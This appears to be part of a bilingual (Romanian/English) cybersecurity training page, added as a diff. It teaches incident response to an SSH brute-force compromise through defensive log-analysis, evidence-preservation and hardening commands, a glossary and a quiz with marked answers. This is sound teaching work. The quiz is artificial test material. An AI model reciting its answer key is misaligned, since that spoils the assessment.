+<li>the <strong>cause</strong>: SSH with a weak password, open to the internet;</li>
+<li><strong>what we change</strong>: SSH over VPN, keys, an alert on "success after failures", unique passwords for technical accounts.</li></ul>
+<p class="key">The report is written blameless: the aim is a better system, not someone to scold.</p>`}},
+
+{at:["ana"],frame:null,kind:"none",
+ title:{ro:"Ce urmează pentru tine",en:"What's next for you"},
+ body:{ro:`<p>Poți reface tot incidentul în laboratorul tău, legal:</p>
+<ul><li>un VM Linux cu SSH și un cont de test cu parolă slabă, <strong>doar în rețeaua internă a laboratorului</strong>;</li>
+<li>din Kali, câteva login-uri greșite cu <code>ssh</code> (nu ai nevoie de unelte de atac ca să generezi loguri);</li>
+<li>pe VM: pipeline-ul de numărat, <code>last</code>, <code>who</code>, apoi fail2ban și <code>PasswordAuthentication no</code>.</li></ul>
+<p>Pentru mai mult exercițiu de analiză: platformele blue team (CyberDefenders, LetsDefend) au incidente complete cu loguri reale.</p>`,
+ en:`<p>You can replay the whole incident in your own lab, legally:</p>
+<ul><li>a Linux VM with SSH and a test account with a weak password, <strong>only on the lab's internal network</strong>;</li>
+<li>from Kali, a few wrong logins with <code>ssh</code> (you don't need attack tools to generate logs);</li>
+<li>on the VM: the counting pipeline, <code>last</code>, <code>who</code>, then fail2ban and <code>PasswordAuthentication no</code>.</li></ul>
+<p>For more analysis practice: the blue-team platforms (CyberDefenders, LetsDefend) have complete incidents with real logs.</p>`}},
+
+{at:["atk","c2","fw","web","siem","ana"],frame:null,kind:"none",summary:true,
+ title:{ro:"Recapitulare",en:"Recap"},
+ body:{ro:`<ul><li>O <strong>alertă</strong> (multe eșecuri) devine <strong>incident</strong> când găsești un succes: <code>grep Accepted</code>.</li>
+<li>Numeri cu <code>grep | awk | sort | uniq -c | sort -rn</code>; ții cont de context (eșecurile colegilor).</li>
+<li>Afli ce a făcut: <code>who</code>, <code>last</code>, istoricul shell-ului; cauți <strong>persistența</strong>: <code>authorized_keys</code>, cron, servicii, utilizatori noi.</li>
+<li><strong>Păstrezi dovezile</strong> (arhivă + hash, snapshot) înainte de orice schimbare.</li>
+<li>Izolare (IP, cont, sesiune) → eradicare (chei, cron, secrete, ideal reconstrucție) → întărire (fără parole pe SSH, fail2ban, VPN).</li>
+<li>Raport fără vinovați: cronologie, impact, cauză, ce schimbăm.</li></ul>
+<p><button type="button" class="btn primary" data-goto="lab">Mergi la laborator ↓</button></p>`,
+ en:`<ul><li>An <strong>alert</strong> (many failures) becomes an <strong>incident</strong> when you find a success: <code>grep Accepted</code>.</li>
+<li>Count with <code>grep | awk | sort | uniq -c | sort -rn</code>; keep context in mind (colleagues' failures).</li>
+<li>Find what it did: <code>who</code>, <code>last</code>, shell history; look for <strong>persistence</strong>: <code>authorized_keys</code>, cron, services, new users.</li>
+<li><strong>Keep the evidence</strong> (archive + hash, snapshot) before any change.</li>
+<li>Containment (IP, account, session) → eradication (keys, cron, secrets, ideally a rebuild) → hardening (no SSH passwords, fail2ban, VPN).</li>
+<li>A blameless report: timeline, impact, cause, what we change.</li></ul>
+<p><button type="button" class="btn primary" data-goto="lab">Go to the lab ↓</button></p>`}}
+],
+
+reference:(T,lang)=>{
+  const ro=lang==="ro";
+  return `<div class="ref-grid"><section class="card refcard"><h2>${ro?"Detecție și analiză":"Detection and analysis"}</h2>
+<pre class="yaml">sudo journalctl -u ssh --since "1 hour ago"
+sudo grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head
+sudo grep "Accepted" /var/log/auth.log
+who; w; last -i -n 20; sudo lastb -n 20
+sudo cat ~deploy/.ssh/authorized_keys
+sudo crontab -l -u deploy; ls /etc/cron.d
+systemctl list-unit-files --state=enabled
+sudo find / -xdev -type f -newermt "2026-11-23 02:41"</pre>
+<h3>${ro?"Dovezi":"Evidence"}</h3>
+<pre class="yaml">sudo tar czf /root/ir-$(date +%F).tgz /var/log/auth.log* ~deploy/.ssh /var/spool/cron
+sha256sum /root/ir-$(date +%F).tgz</pre></section>
+<section class="card refcard"><h2>${ro?"Izolare, eradicare, întărire":"Containment, eradication, hardening"}</h2>
+<pre class="yaml">sudo nft add rule inet filter input ip saddr 203.0.113.45 drop
+sudo usermod -L -e 1 deploy
+sudo pkill -KILL -u deploy
+sudo crontab -r -u deploy
+<span class="c"># /etc/ssh/sshd_config.d/10-harden.conf</span>
+PasswordAuthentication no
+PermitRootLogin no
+AllowUsers ana deploy
+sudo sshd -t && sudo systemctl reload ssh
+sudo apt install fail2ban && sudo systemctl enable --now fail2ban
+sudo fail2ban-client status sshd</pre></section></div>`;
+},
+
+gloss:[
+ ["SIEM",null,{ro:"Sistem care adună loguri din multe surse și rulează reguli de detecție.",en:"A system that collects logs from many sources and runs detection rules."}],
+ [{ro:"Alertă",en:"Alert"},null,{ro:"Semnal că o regulă s-a declanșat; trebuie investigat.",en:"A signal that a rule fired; it needs investigating."}],
+ ["Incident",null,{ro:"Un eveniment confirmat care afectează securitatea (ex. un acces reușit neautorizat).",en:"A confirmed event affecting security (e.g. a successful unauthorised access)."}],
+ ["Brute force",null,{ro:"Ghicirea parolelor prin încercări automate repetate.",en:"Guessing passwords through repeated automated attempts."}],
+ [{ro:"Persistență",en:"Persistence"},null,{ro:"Ce lasă un atacator ca să poată reveni: chei, cron, servicii, conturi.",en:"What an attacker leaves to be able to return: keys, cron, services, accounts."}],
+ ["IOC",null,{ro:"Indicator of compromise: o urmă concretă (IP, hash, cheie) care arată compromiterea.",en:"Indicator of compromise: a concrete trace (IP, hash, key) showing a compromise."}],
+ [{ro:"Izolare",en:"Containment"},null,{ro:"Oprirea răspândirii: blocare, conturi dezactivate, sesiuni închise.",en:"Stopping the spread: blocks, disabled accounts, killed sessions."}],
+ [{ro:"Eradicare",en:"Eradication"},null,{ro:"Eliminarea tuturor urmelor atacatorului.",en:"Removing every trace of the attacker."}],
+ ["fail2ban",null,{ro:"Citește loguri și blochează automat adresele cu prea multe eșecuri.",en:"Reads logs and automatically bans addresses with too many failures."}],
+ ["Blameless",null,{ro:"Analiză post-incident fără căutarea unui vinovat; scopul e îmbunătățirea.",en:"A post-incident review without blaming anyone; the aim is improvement."}]
+],
+glossEx:{
+ "IOC":{ro:"Aici: 203.0.113.45, 198.51.100.7 și cheia root@kali.",en:"Here: 203.0.113.45, 198.51.100.7 and the root@kali key."},
+ "Incident":{ro:"Linia „Accepted password for deploy” a transformat alerta în incident.",en:"The \"Accepted password for deploy\" line turned the alert into an incident."}
+},
+
+quiz:[
+ {"q":{"ro":"Ce transformă alerta „1.284 de eșecuri SSH” într-un incident?","en":"What turns the alert \"1,284 SSH failures\" into an incident?"},"o":[{"ro":"Numărul mare de eșecuri","en":"The high number of failures"},{"ro":"O linie „Accepted” de la aceeași adresă: atacul a reușit","en":"An \"Accepted\" line from the same address: the attack succeeded"},{"ro":"Ora din noapte","en":"The time of night"},{"ro":"Faptul că portul e 22","en":"That the port is 22"}],"a":1,"e":{"ro":"Eșecurile sunt zgomot; succesul e incidentul.","en":"Failures are noise; the success is the incident."}},
+ {"q":{"ro":"Ce face „sort | uniq -c” în pipeline?","en":"What does \"sort | uniq -c\" do in the pipeline?"},"o":[{"ro":"Șterge logurile","en":"Deletes the logs"},{"ro":"Criptează adresele","en":"Encrypts the addresses"},{"ro":"Grupează valorile identice și le numără","en":"Groups identical values and counts them"},{"ro":"Trimite alerta","en":"Sends the alert"}],"a":2,"e":{"ro":"uniq numără doar linii identice alăturate, de aceea e nevoie de sort înainte.","en":"uniq only counts adjacent identical lines, hence the sort first."}},
+ {"q":{"ro":"Unde își lasă des un atacator persistența pe Linux?","en":"Where does an attacker often leave persistence on Linux?"},"o":[{"ro":"În ~/.ssh/authorized_keys și în cron","en":"In ~/.ssh/authorized_keys and in cron"},{"ro":"În /tmp/cache-ul browserului","en":"In the browser cache in /tmp"},{"ro":"În BIOS, mereu","en":"Always in the BIOS"},{"ro":"Nicăieri, nu are nevoie","en":"Nowhere, they don't need to"}],"a":0,"e":{"ro":"Plus servicii systemd și utilizatori noi.","en":"Plus systemd services and new users."}},
+ {"q":{"ro":"Ce faci ÎNAINTE să ștergi cheia străină și cron-ul?","en":"What do you do BEFORE deleting the foreign key and the cron job?"},"o":[{"ro":"Repornești serverul","en":"Reboot the server"},{"ro":"Nimic, ștergi repede","en":"Nothing, delete fast"},{"ro":"Păstrezi dovezile: arhivă cu hash și snapshot","en":"Keep the evidence: an archive with a hash and a snapshot"},{"ro":"Ștergi logurile ca să faci loc","en":"Delete the logs to free space"}],"a":2,"e":{"ro":"Curățarea distruge informație.","en":"Cleanup destroys information."}},
+ {"q":{"ro":"De ce nu ajunge doar blocarea IP-ului atacatorului?","en":"Why isn't blocking the attacker's IP enough?"},"o":[{"ro":"Pentru că atacatorul poate schimba adresa; blochezi și contul și închizi sesiunea","en":"Because the attacker can change address; you also lock the account and kill the session"},{"ro":"Pentru că firewall-ul nu poate bloca IP-uri","en":"Because firewalls can't block IPs"},{"ro":"Ajunge","en":"It is enough"},{"ro":"Pentru că IP-urile sunt criptate","en":"Because IPs are encrypted"}],"a":0,"e":{"ro":"Iar cheia străină trebuie ștearsă.","en":"And the foreign key must be removed."}},
+ {"q":{"ro":"Ce setare elimină complet ghicirea parolelor pe SSH?","en":"Which setting removes SSH password guessing entirely?"},"o":[{"ro":"Port 2222","en":"Port 2222"},{"ro":"PasswordAuthentication no (doar chei)","en":"PasswordAuthentication no (keys only)"},{"ro":"LogLevel DEBUG","en":"LogLevel DEBUG"},{"ro":"MaxSessions 1","en":"MaxSessions 1"}],"a":1,"e":{"ro":"Fără parole, nu e nimic de ghicit.","en":"No passwords, nothing to guess."}},
+ {"q":{"ro":"Pe un server important compromis, care e varianta cea mai sigură?","en":"On an important compromised server, what's the safest option?"},"o":[{"ro":"Ștergi doar scriptul descărcat","en":"Delete only the downloaded script"},{"ro":"Îl lași, dacă merge","en":"Leave it, if it works"},{"ro":"Schimbi doar parola","en":"Change only the password"},{"ro":"Îl reconstruiești dintr-o imagine curată și muți datele verificate","en":"Rebuild it from a clean image and move verified data over"}],"a":3,"e":{"ro":"Nu poți fi sigur că ai găsit tot.","en":"You can't be sure you found everything."}},
+ {"q":{"ro":"Ce înseamnă un raport „blameless”?","en":"What does a \"blameless\" report mean?"},"o":[{"ro":"Fără cronologie","en":"No timeline"},{"ro":"Se concentrează pe cauze și îmbunătățiri, nu pe un vinovat","en":"It focuses on causes and improvements, not on someone to blame"},{"ro":"Nu se scrie","en":"It isn't written"},{"ro":"Îl scrie atacatorul","en":"The attacker writes it"}],"a":1,"e":{"ro":"Oamenii raportează mai deschis când nu se tem.","en":"People report more openly when they aren't afraid."}}
+]
+};
+})();
+</script>
+<script src="../assets/engine.js?v=4"></script>
+<script src="../assets/labs-data.js?v=11"></script>
+<script src="../assets/lab.js?v=2"></script>
+<script type="module" src="../assets/auth.js?v=19"></script>
+</body>
+</html>
